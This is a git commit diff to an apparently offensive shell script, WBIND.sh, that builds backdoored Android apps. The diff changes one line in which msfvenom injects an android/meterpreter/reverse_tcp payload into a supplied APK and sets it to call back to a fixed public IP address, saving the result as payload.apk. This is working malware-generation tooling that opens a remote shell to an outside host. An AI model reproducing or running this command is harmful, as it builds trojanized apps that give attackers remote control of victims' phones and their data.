93a97b9e1327672849c363c44298f6dc8e6b4447
Tech EFX Tv <59799893+efxtv@users.noreply.github.com>
2022-04-11 13:53:08 +0530

    Update WBIND.sh

--- Demo/WBIND.sh
+++ Demo/WBIND.sh
@@ -140,7 +140,9 @@ echo -e "${IBlue}[${clear}${IGreen}+${clear}${IBlue}]${clear} Generating payload
 echo -e "${IBlue}[${clear}${IGreen}+${clear}${IBlue}]${clear} Please wait... "
 sleep 3
 
-msfvenom -x $app -p android/meterpreter/reverse_tcp LHOST=193.161.193.99 LPORT=$lport -o $op
+#msfvenom -x $app -p android/meterpreter/reverse_tcp LHOST=193.161.193.99 LPORT=$lport -o $op
+msfvenom -x $app -a dalvik --platform android -p android/meterpreter/reverse_tcp LHOST=193.161.193.99 LPORT=$lport R> payload.apk
+
 
 
 
